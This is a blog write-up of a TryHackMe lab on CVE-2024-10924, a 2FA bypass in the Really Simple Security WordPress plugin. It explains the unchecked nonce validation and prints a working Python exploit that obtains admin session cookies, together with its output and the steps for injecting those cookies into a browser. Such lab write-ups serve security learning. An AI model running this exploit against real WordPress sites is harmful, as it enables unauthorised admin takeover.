---
title: "Bypassing 2FA in WordPress"
excerpt: Walkthrough of how a simple bug in some WordPress PHP code can lead to admin control and privilege escalation.
date: 2025-10-27
---

WordPress is one of the most popular open-source Content Management Systems (CMS) and it is widely used to build websites ranging from blogs to e-commerce platforms.

I've always heard people say that WordPress used to be somewhat of an insecure platform and that it was plagued by various vulnerabilities over the years. However, thus far I have never encountered any such exploits in the wild, which I wanted to change. I found the room "Bypass Really Simple Security" on TryHackMe, which discusses CVE 2024-10924, one of the more severe WordPress vulnerabilities.

In November 2024, a critical vulnerability was discovered in the Really Simple Security plugin for WordPress, a widely adopted security plugin used by millions of websites.

The goal of this post is to explain how the exploit works and how we actually *use* the exploit in practice.


## 1 How the Vulnerability Works

The point of the WordPress Really Simple Security plugin was to implement things like two-factor authentication (2FA). However, due to due to non-adherence to secure coding practices while handling REST API endpoints leads to the vulnerability. More precisely, improper validation during the authentication process allows attackers to exploit API endpoints and bypass critical checks.

In order to describe the vulnerability in more detail, we need to view the source code of the plugin. It contains a PHP class called `Rsssl_Two_Factor_On_Board_Api`, which includes three functions that are of interest:

#### 1.1 `skip_onboarding`

This function skips or manages the 2FA onboarding process for a user by validating their credentials and redirecting them after authentication. It begins by extracting the three parameters from the request, including `user_id`, `login_nonce`, and `redirect_to`. These parameters are then passed to the `check_login_and_get_user` function for validation. If a valid user object is returned, the method calls `authenticate_and_redirect`, redirecting the user to the provided `redirect_to` URL.
```php
/**
 * Skips the onboarding process for the user.
 *
 * @param WP_REST_Request $request The REST request object.
 *
 * @return WP_REST_Response The REST response object.
 */

public function skip_onboarding( WP_REST_Request $request ): WP_REST_Response {
    $parameters = new Rsssl_Request_Parameters( $request );
    // As a double we check the user_id with the login nonce.
    $user = $this->check_login_and_get_user( (int)$parameters->user_id, $parameters->login_nonce );
    return $this->authenticate_and_redirect( $parameters->user_id, $parameters->redirect_to );
```

#### 1.2 `check_login_and_get_user`

This function is responsible for validating the user_id and login_nonce. Using another function, it checks the login_nonce, and if it returns `null`, then we should expect an authentication failure.
```php
/**
 * Verifies a login nonce, gets user by the user id, and returns an error response if any steps fail.
 *
 * @param int    $user_id The user ID.
 * @param string $login_nonce The login nonce.
 *
 * @return WP_User|WP_REST_Response
 */

private function check_login_and_get_user( int $user_id, string $login_nonce ) {
    if ( ! Rsssl_Two_Fa_Authentication::verify_login_nonce( $user_id, $login_nonce ) ) {
      return new WP_REST_Response( array( 'error' => 'Invalid login nonce' ), 403 );
    }
```

#### 1.3 `authenticate_and_redirect`

This function redirects the user after successful authentication. It assumes that the earlier methods have already authenticated the user. It uses the user_id and redirect_to parameters to redirect the user to the desired URL.
```php
/**
 * Sets the authentication cookie and returns a success response.
 *
 * @param int    $user_id The user ID.
 * @param string $redirect_to The redirect URL.
 *
 * @return WP_REST_Response
 */
 
private function authenticate_and_redirect( int $user_id, string $redirect_to = '' ): WP_REST_Response {
    // Okay checked the provider now authenticate the user.
    wp_set_auth_cookie( $user_id, true );
    // Finally redirect the user to the redirect_to page or to the home page if the redirect_to is not set.
    $redirect_to = $redirect_to ?: home_url();
    return new WP_REST_Response( array( 'redirect_to' => $redirect_to ), 200 );
}
```

The vulnerability arises from the way in which the `skip_onboarding` method is written. Notice that this method never validates the return value of `check_login_and_get_user`, meaning that we will **always** be authenticated and redirected, no matter the result of the `check_login_and_get_user` function. The call to `skip_onboarding` is carried out through the REST API endpoint `/?rest_route=/reallysimplessl/v1/two_fa/skip_onboarding` with POST parameters user_id, login_none and redirect_to URL. 

A short schematic of this process would look something like this:

<div class="flex justify-center items-center">
  <img
    src="https://github.com/user-attachments/assets/d9f86d73-dac6-4fc6-9a50-dda75d487860"
    alt="image"
    class="h-auto w-auto max-w-full max-h-[232px] object-contain"
  />
</div>


## 2 Exploiting the Vulnerability

Now we will discuss how to actually exploit this backdooor. In short, we need to send a crafted POST request to the vulnerable `/reallysimplessl/v1/two_fa/skip_onboarding` endpoint.

In the attached VM in the TryHackMe room, we find a vulnerable page at the URL `http://vulnerablewp.thm:8080/wp-admin`. If we visit this site, we find it is protected by a login panel. Since we want to gain admin access, the goal is to retrieve credentials for the user with `user_id = 1`.

<center>    
    <img width="400" height="377" alt="image" src="https://github.com/user-attachments/assets/77fa2bfc-4415-4301-bce0-0e604bf3770e" />
</center>

Because we need to forge a custom POST request, we use a short python script to make our lives easier:
```python
import requests
import urllib.parse
import sys

if len(sys.argv) != 2:
    print("Usage: python exploit.py <user_id>")
    sys.exit(1)

user_id = sys.argv[1]

url = "http://vulnerablewp.thm:8080/?rest_route=/reallysimplessl/v1/two_fa/skip_onboarding"
data = {
    "user_id": int(user_id),  # User ID from the argument
    "login_nonce": "invalid_nonce",  # Arbitrary value
    "redirect_to": "/wp-admin/"  # Target redirection
}

# Sending the POST request
response = requests.post(url, json=data)

# Checking the response
if response.status_code == 200:
    print("Request successful!\n")
    
    # Extracting cookies
    cookies = response.cookies.get_dict()
    count = 1

    for name, value in cookies.items():
        decoded_value = urllib.parse.unquote(value)  # Decode the URL-encoded cookie value
        print(f"Cookie {count}:")
        print(f"Cookie Name: {name}")
        print(f"Cookie Value: {decoded_value}\n")
        count += 1
else:
    print("Request failed!")
    print(f"Status Code: {response.status_code}")
    print(f"Response Text: {response.text}")
```
Roughly speaking, the script takes as input the value of the user_id, sends a POST request to the vulnerable endpoit with the three parameters `user_id`, `login_nonce` and `redirect_to` for the `skip_onboarding` method, and finally it checks the response for any cookies that get sent our way, with which we can then gain admin access later.

The code is found in `~/Desktop` on the VM, and it returns the following cookies:
```console
ubuntu@ip-10-10-59-11:~$ cd Desktop/
ubuntu@ip-10-10-59-11:~/Desktop$ chmod +x exploit.py 
ubuntu@ip-10-10-59-11:~/Desktop$ python3 exploit.py 1
Request successful!

Cookie 1:
Cookie Name: wordpress_logged_in_eb51341dc89ca85477118d98a618ef6f
Cookie Value: admin|1762771286|hME4PfkCu3cbqkvp6aRU4zTwQLgmnXqkbbhobHSNuGV|7c4195157ed7a4298ac006513d2a15d37c623e7c01aa7f4790d22113eee6f73c

Cookie 2:
Cookie Name: wordpress_eb51341dc89ca85477118d98a618ef6f
Cookie Value: admin|1762771286|hME4PfkCu3cbqkvp6aRU4zTwQLgmnXqkbbhobHSNuGV|d1a0158d989b68c2b4006c2c225976ded2f1fd0d3894eccd6b8964c10e63507c
```
Next, we inspect the admin login page (Ctrl+Shift+I) and navigate to the "Storage" tab. Here we simply add two new cookies with the respective cookie name and cookie value, that we found with the above python script. 

<div class="flex justify-center items-center">
  <img
    src="https://github.com/user-attachments/assets/f9a3c109-8e36-465a-842b-a5148f336883"
    alt="image"
    class="h-auto w-auto max-w-full max-h-[232px] object-contain"
  />
</div>

After entering the cookies, exit the inspection panel and enter the URL `http://vulnerablewp.thm:8080/wp-admin` into the search ar once more and hit Enter. We now have access to the admin dashboard of the website, as seen in the image below:

<div class="flex justify-center items-center">
  <img
    src="https://github.com/user-attachments/assets/170cd6f8-1517-463e-9cbb-be7ecdaae722"
    alt="image"
    class="h-auto w-auto max-w-full max-h-[232px] object-contain"
  />
</div>

Now we can go ahead and answer the questions in the TryHackMe room to finish the task. In a real-life scenario, my guess is that the cookies do not take the exact form 
```text
admin|1762771286|hME4PfkCu3cbqkvp6aRU4zTwQLgmnXqkbbhobHSNuGV|7c4195157ed7a4298ac006513d2a15d37c623e7c01aa7f4790d22113eee6f73c,
```
i.e. it would not necessarily say "admin", because we simply acquired a cookie from the broken `skip_onboarding` method, which, a priori, has nothing to do with whether you're an admin or not.

This was a fun exercise. Not only did I finally manage to walk through a concrete WordPress-related vulnerability, but I also learned that source code of an application that is in production can still sometimes contain accidental bugs that lead to critical issues, even though we always think of production-code as being flawless.








